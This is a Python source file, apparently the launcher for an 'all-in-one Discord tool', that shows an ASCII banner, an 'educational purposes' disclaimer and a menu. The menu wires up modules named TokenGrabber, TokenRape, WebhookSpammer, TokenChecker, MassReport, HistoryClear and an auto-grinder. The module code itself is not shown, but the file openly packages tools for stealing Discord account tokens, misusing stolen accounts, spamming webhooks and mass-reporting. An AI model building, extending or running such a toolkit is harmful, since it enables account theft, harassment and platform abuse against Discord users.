LICENSE="hi" 
import time
import os

print(LICENSE)

time.sleep(1)
os.system('cls' if os.name == 'nt' else 'clear')

print("Checking internal version with servers")
try:
    import requests
except ImportError as ex:
    input(f"Module {ex.name} not installed, to install run '{'python' if os.name == 'nt' else 'python3.8'} -m pip install {ex.name}'\nPress enter to exit")
    exit()

response = requests.get("https://raw.githubusercontent.com/flexk7ll/flex-tool/main/version.txt")

with open("version.txt", "r") as file:
    curVersion = file.read().strip()

if response.status_code != 200:
    exit()

if curVersion != response.text.strip():
    print("WARNING: There is a newer version avaliable at \nhttps://github.com/logicguy1/The-all-in-one-discord-tool\nIt's highly recommended to update as soon as possible.\nThis message will dissapear in 5 seconds.")
    time.sleep(5)

try:
    import time
    import os
    from colored import fg, bg, attr
    import modules.massReport as massReport
    import modules.credits as credits
    import modules.tokenGrabber as grabber
    import modules.tokenRape as tokenRape
    import modules.historyClear as historyClear
    import modules.tokenWebhookChecker as checkers
    import modules.webhookSpammer as spammer
    import modules.autoBump as bumper
    import modules.dankMemer as memer
    import modules.serverLookup as serverLookup
except ImportError as ex:
    input(f"Module {ex.name} not installed, to install run '{'python' if os.name == 'nt' else 'python3.8'} -m pip install {ex.name}'\nPress enter to exit")
    exit()


r = fg(241) # Setup color variables
r2 = fg(255)
b = fg(31)
w = fg(15)
y = fg(3) + attr(1)
d = r2 + attr(21)

class Client:
    def __init__(self):
        modules = {
            "1" : {"function" : tokenRape.rape, "name" : "TokenRape"},
            "2" : {"function" : spammer.spammer, "name" : "WebhookSpammer"},
            "3" : {"function" : checkers.token, "name" : "TokenChecker"},
            "4" : {"function" : checkers.webhook, "name" : "WebhookChecker"},
            "5" : {"function" : checkers.webhook_deleter, "name" : "WebhookDeleter"},
            "6" : {"function" : historyClear.clear, "name" : "HistoryClear"},
            "7" : {"function" : bumper.bumper, "name" : "AutoBump"},
            "8" : {"function" : grabber.create_grabber, "name" : "TokenGrabber"},
            "9" : {"function" : memer.start, "name" : "DankMemerGrinder"},
            "10" : {"function" : serverLookup.fetch_data, "name" : "ServerLookup"},
            "11" : {"function" : massReport.start, "name" : "MassReport"},
            "12" : {"function" : credits.show_credits, "name" : "Credits"},
            "13" : {"function" : exit, "name" : "Exit"}
        }
        self.modules = modules

    def main(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f""" 
{r2}███████╗{b}██╗     {r2}███████╗{b}██╗  ██╗
{r2}██╔════╝{b}██║     {r2}██╔════╝{b}╚██╗██╔╝
{r2}█████╗  {b}██║     {r2}█████╗  {b} ╚███╔╝ 
{r2}██╔══╝  {b}██║     {r2}██╔══╝  {b} ██╔██╗ 
{r2}██║     {b}███████╗{r2}███████╗{b}██╔╝ ██╗
{b}╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝


{r2}████████╗{b}███████╗{r2} █████╗ {b}███╗   ███╗
{r2}╚══██╔══╝{b}██╔════╝{r2}██╔══██╗{b}████╗ ████║
{r2}   ██║   {b}█████╗  {r2}███████║{b}██╔████╔██║
{r2}   ██║   {b}██╔══╝  {r2}██╔══██║{b}██║╚██╔╝██║
{r2}   ██║   {b}███████╗{r2}██║  ██║{b}██║ ╚═╝ ██║
{b}   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝


{r2}* DISCLAIMER: This script is made for          *
{b}* educational purposes and the developers      *
{r2}* assume no liability and are not responsible  *
{b}* for any misuse or damages caused by the      *
{r2}* script                                       *
""")
       
        
      
        indx = 0
        for key, val in self.modules.items():
            num = f"{r2}[{b}{key}{r2}]"
            print(
                f" {num:<6} {val['name']:<{20 if int(key) < 10 else 19}}",
                end = "" if indx % 2 == 0 else "\n"
            )
            indx += 1

        if indx % 2 == 1:
            print("")

        option = input(f"\n {r2}[{b}?{r2}] Option: ")

        data = self.modules[option]
        
        try:
            data["function"]()
        except KeyboardInterrupt:
            input(f"\n {r2}[{b}!{r2}] Keyboard Interrupt")
        else:
            input(f"\n {r2}[{b}!{r2}] Done! Press enter to continue")
        
        self.main()

if __name__ == '__main__':
    client = Client()
    client.main()
